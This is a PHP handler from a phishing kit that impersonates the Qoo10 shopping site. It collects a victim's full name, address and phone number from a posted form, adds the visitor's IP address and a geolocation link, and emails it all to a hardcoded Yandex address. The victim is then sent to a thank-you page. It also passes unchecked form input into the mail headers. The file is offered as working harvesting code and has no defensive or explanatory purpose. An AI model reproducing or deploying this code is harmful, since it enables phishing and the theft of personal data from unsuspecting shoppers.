<?php


$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$bilsmg .= "------------+Don| BESMELLAH |DJOU+------------\n";
$bilsmg .= "Full name               : ".$_POST['name']."\n";
$bilsmg .= "Address              : ".$_POST['address']."\n";
$bilsmg .= "|Phone -----: ".$_POST['phone']."<br>\n";



$bilsmg .= "------------+Don| HAMDOULELLEH |DJOU+------------\n";
$bilsmg .= "From $ip             check in http://www.geoiptool.com/?IP=$ip   \n";


$bilsnd = "jahanamcafe@yandex.com";
$bilsub = "Qoo10 Adrress | From $ip";
    $bilhead = "From:Qoo10 MALL Address <KOMANDAN>";
$bilhead .= $_POST['bat']."\n";
$bilhead .= "MIME-Version: 1.0\n";
$arr=array($bilsnd, $IP);
foreach ($arr as $bilsnd)
mail($bilsnd,$bilsub,$bilsmg,$bilhead);

$src="../thank-you.html";
header("location:$src");
?>
?>